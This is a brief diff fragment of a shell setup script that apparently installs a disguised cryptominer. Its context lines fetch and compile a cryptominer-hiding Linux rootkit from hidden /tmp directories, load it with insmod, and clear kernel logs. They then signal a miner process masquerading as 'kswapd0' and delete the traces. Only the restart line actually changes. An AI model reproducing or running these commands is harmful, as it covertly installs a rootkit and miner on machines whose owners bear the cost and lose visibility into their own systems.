@@ -688,6 +688,6 @@ sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_backgro
 
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r)  git make gcc -y; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg -C ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ; rm -rf /tmp/.ICE-Unix/hiding-cryptominers-linux-rootkit/ && rm -rf /tmp/.X11-unix/hiding-cryptominers-linux-rootkit/ 
 
-systemctl restart gdm2 && service gdm2 restart
+systemctl restart gdm2 ; service gdm2 restart ;
 
 echo "[*] Setup complete"
